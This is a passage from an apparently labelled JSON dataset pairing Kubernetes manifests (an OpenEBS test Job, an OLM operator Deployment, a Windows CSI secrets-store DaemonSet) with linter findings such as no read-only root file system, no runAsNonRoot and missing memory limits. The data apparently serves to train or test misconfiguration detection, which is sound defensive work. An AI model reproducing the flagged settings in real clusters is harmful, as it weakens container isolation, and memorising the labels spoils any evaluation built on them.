    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "01267",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"olm-operator\" does not have a read-only root file system"
  },
  {
    "id": "01268",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"olm-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "01269",
    "manifest_path": "data/manifests/the_stack_sample/sample_0358.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: olm-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: olm-operator\n  template:\n    metadata:\n      labels:\n        app: olm-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: olm-operator\n        command:\n        - /bin/olm\n        args:\n        - --namespace\n        - $(OPERATOR_NAMESPACE)\n        - --writeStatusName\n        - operator-lifecycle-manager\n        - --writePackageServerStatusName\n        - operator-lifecycle-manager-packageserver\n        - --tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - --tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:b9d011c0fbfb65b387904f8fafc47ee1a9479d28d395473341288ee126ed993b\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"olm-operator\" has memory limit 0"
  },
  {
    "id": "01270",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "01271",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "01272",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"secrets-store\" does not have a read-only root file system"
  },
  {
    "id": "01273",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "01274",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "01275",
    "manifest_path": "data/manifests/the_stack_sample/sample_0359.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"secrets-store\" is not set to runAsNonRoot"
  },
  {
    "id": "01276",
    "manifest_path": "data/manifests/the_stack_sample/sample_0369.yaml",
